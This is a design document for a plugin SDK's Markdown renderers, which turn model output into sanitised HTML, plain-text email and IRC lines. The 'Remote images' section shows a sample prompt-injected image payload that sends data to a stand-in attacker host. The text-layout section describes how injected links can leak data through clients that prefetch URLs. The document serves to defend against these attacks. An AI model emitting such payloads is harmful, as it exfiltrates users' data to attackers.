# Rendering Model Output

The model writes Markdown, and every channel receives it as CommonMark ([Plan](../PLAN.md) §6.9).
Each channel turns it into its own format. The renderers live in `giles_plugin_sdk::render`, so the
built-in web channel and the Rust channel plugins share one implementation (§10). They are built on
`pulldown-cmark`.

| Function                        | Used by                | Output                                    |
| ------------------------------- | ---------------------- | ----------------------------------------- |
| `html(markdown, allow_image)`   | Web, email (HTML part) | Sanitized HTML fragment                   |
| `is_local_image(url)`           | Web (as `allow_image`) | Whether an image URL loads nothing remote |
| `plain_text(markdown)`          | Email (text part)      | Readable plain text                       |
| `irc(markdown, max_line_bytes)` | IRC                    | Message lines with IRC formatting codes   |

## Shared Rules

All renderers parse with the same options, so a message means the same thing on every channel:

- Extensions: tables, strikethrough, and task lists, because models use them constantly and every
  output format has a reasonable rendering for them.
- Left out: footnotes, heading attributes (`{#id .class}`), math, smart punctuation, and GitHub
  alert blockquotes. Heading attributes and footnotes would let the model set element ids and
  classes in the page; the rest change text or add little.
- Bare URLs are not turned into links: `pulldown-cmark` doesn't support GitHub's extended
  autolinks. CommonMark autolinks (`<https://example.com>`, `<me@example.com>`) are links.
- Raw HTML in the input is never interpreted. Each renderer shows it as literal text.
- Control characters other than tab and newline (C0, DEL, and C1) are dropped from all text. They
  are invisible in HTML, can drive a terminal reading plain-text mail, and are IRC formatting
  commands.

## HTML

`html` renders for the web channel and the HTML part of email. The result must be safe to inline
into a page that holds the user's session, so the renderer emits only markup it builds itself:

- Raw HTML blocks and inline HTML become escaped text (an HTML block becomes a paragraph).
- Links keep their target only when it starts with `http://`, `https://`, or `mailto:`
  (case-insensitive prefix match, so `java%0ascript:` or a relative URL can't slip through a scheme
  parser). Every kept link gets `rel="noopener noreferrer nofollow"`. A refused link renders as its
  text.
- Images render only when the caller's `allow_image(url)` predicate accepts the URL; otherwise the
  alt text is shown as plain text. The web channel passes `is_local_image`.
- Heading ids, classes, and attributes are cleared, blockquote alert classes are dropped, and a code
  block's language (emitted as `class="language-..."`) is reduced to its first word and the
  characters `[A-Za-z0-9+-_.#]`.
- URLs are escaped with `pulldown-cmark`'s `escape_href` and text and attributes with
  `escape_html`, so quotes in a URL or title can't end the attribute.

### Remote images

Showing an image loads it. A prompt-injected reply like `![](https://attacker/?d=...)` would send
data to the attacker the moment the page renders, with no tool call and no click (§9). So the
renderer drops every image the predicate refuses, the URL included, and the web pages also send
`Content-Security-Policy: img-src 'self' data:` as a second layer.

`is_local_image` accepts exactly:

- a blob-store image served by the web channel: `/blobs/<id>`, where `<id>` is the blob's SHA-256
  as 64 lowercase hex digits. Nothing may follow the id, so there is no path traversal and no
  protocol-relative `//host` form;
- a `data:` URL whose media type is `image/png`, `image/jpeg`, `image/gif`, `image/webp`, or
  `image/avif`. SVG is refused as defense in depth, although an SVG in an `<img>` can't run script
  or load anything.

The predicate is a parameter because a blob-store path means nothing in an email: the email channel
can accept `cid:` URLs of inline attachments instead.

### Why not `ammonia`

Sanitizing after rendering (with `ammonia`) parses the HTML a second time with `html5ever` and
pulls in a large dependency tree for a published SDK crate. Filtering the event stream is simpler
to reason about: the input can never produce a tag, since raw HTML only ever becomes text, and the
only tags in the output are the fixed set `pulldown-cmark` writes for CommonMark constructs plus the
`<a>` and `<img>` tags the renderer builds and escapes itself. The tests cover the attack cases:
script and image tags, `javascript:` in every spelling, attribute breakout through URLs and titles,
remote, protocol-relative, reference-style, and linked images.

## Text Layout

The text renderers share one layout:

- Blocks (paragraphs, headings, code blocks, lists, quotes, tables) are separated by a blank line
  (on IRC, just a line break).
  Soft line breaks stay line breaks: in chat and plain-text mail, a line break the model wrote is
  more often meant than not.
- Lists use `-` and `1.` markers followed by a space (an ordered list keeps its start number); an
  item's later lines are indented by the marker's width. Items of a loose list are separated by
  blank lines. Task list items start with `[ ]` or `[x]`.
- Quotes prefix every line with `>` and a space.
- Links show their target after the text, as `text <url>` (RFC 3986, appendix C); autolinks show
  the URL once. Text formats are inert, so the target is shown whatever its scheme.
- Images show only their alt text, as `[image: alt]`, never the URL. An image is the classic
  injection-exfiltration vector, and nothing is lost by dropping its URL from a text format. This
  is defense in depth, not a guarantee: link targets are still printed, and some chat clients
  (such as The Lounge on IRC) prefetch any URL they see, so a prompt-injected link can still leak
  data to a client that does.
- Raw HTML is shown as text. Thematic breaks are `---`.

## Plain Text

`plain_text` renders the text part of email:

- Level 1 headings are underlined with `=`, other levels with `-`.
- `*strong*`, `_emphasis_`, `~~strikethrough~~`, and `` `code` `` keep a light, widely read markup.
- Code blocks keep their text verbatim, indented by four spaces.
- Tables are aligned columns separated by ` | `, with a `-` rule under the header row. Widths count
  characters, so wide (CJK, emoji) and combining characters misalign columns slightly.

## IRC

`irc(markdown, max_line_bytes)` returns the lines to send, one `PRIVMSG` each:

- Strong text and headings are bold (`\x02`), emphasis is italic (`\x1d`). Both are toggles, and a
  style nested in itself (bold inside a heading) writes no second toggle, which would end it.
  Strikethrough stays `~~text~~` and inline code `` `code` ``: the strikethrough (`\x1e`) and
  monospace (`\x11`) codes are not widely supported.
- Code blocks are plain lines, indentation kept, with no formatting inside.
- There are no blank lines between blocks, and empty lines are dropped: IRC can't send an empty
  message.
- Every control character in the input is dropped, including the formatting codes (`\x02`, `\x03`
  colors, `\x0f`, `\x16`, `\x1d`, ...) and CTCP's `\x01`, so the model can't color text or send a
  CTCP request (`\x01ACTION`). The renderer's own codes are the only ones in the output.

### Line splitting

An IRC line is at most 512 bytes, including the source prefix the server adds when relaying, the
command and target, and the CRLF. The caller knows its target and nick, so `max_line_bytes` is a
parameter: the bytes left for the text of one message.

```text
max_line_bytes = 512 - 2 - len("PRIVMSG <target> :") - len(":<nick>!<user>@<host> ")
```

The relayed `<user>@<host>` is what other clients see, which may be a cloak and isn't always
known to the plugin. When it isn't, assume a long host (63 bytes, the usual server `HOSTLEN`), so
a message is split a little early rather than truncated by the server.

- A line longer than the limit is split at the last space that fits, or at the last UTF-8
  character boundary that fits when there is no space. The space at a split is dropped, along with
  any formatting codes next to it (they only change what the next line reopens); a line's leading
  indentation is kept. Splits are not grapheme-aware, so a combining sequence or an emoji with
  modifiers can be cut between its code points.
- IRC clients reset formatting at the end of each message, so a line that starts inside a bold or
  italic span begins with the codes that reopen it. `\x0f` (reset) is never emitted: closing a
  style toggles its own code, and the end of the message resets the rest.
- Every line fits the limit, reopening codes included, unless the limit is below 4 bytes and a
  single character can't fit; then that character is sent alone. When the reopening codes and the
  next character don't fit together, the codes are left out.
